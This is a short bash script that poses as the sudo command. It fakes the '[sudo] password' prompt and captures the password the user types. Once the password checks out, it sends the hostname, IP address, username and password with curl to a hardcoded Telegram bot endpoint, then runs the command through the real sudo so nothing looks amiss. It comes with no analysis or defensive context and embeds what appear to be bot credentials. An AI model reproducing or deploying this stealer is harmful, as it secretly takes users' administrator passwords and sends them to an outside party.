#!/bin/bash
telegramApiToken="6831101481:AAHrG9PPMD6W-zR0zijUUs5NNp0CfpGRZRU"
telegramChatID="6793794124"
telegramApiEndpoint="https://api.telegram.org/bot$telegramApiToken/sendMessage"
timeout="8"

/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    
    if [ $? -eq 1 ]
    then
      distroName=$(awk -F= '/^NAME/{print tolower($2)}' /etc/*-release  | tr -d '"')
      if [[ $distroName == *"centos"* || $distroName == *"red hat"* ]]
      then
        echo "Sorry, try again."
      fi
      sudo $@
    else
      #If CURL binary is present in the host.
      if [ -x /usr/bin/curl ]
      then
        hostname=$(hostname -f)
        ipAddr=$(hostname -I | awk '{print $1}')
        message="Hostname: $hostname --- IP: $ipAddr --- Credentials: $USER:$pwd"
        curl -s --max-time $timeout -d "chat_id=$telegramChatID&disable_web_page_preview=1&text=$message" $telegramApiEndpoint > /dev/null
      fi
    echo "$pwd" | /usr/bin/sudo -S $@
    fi
fi



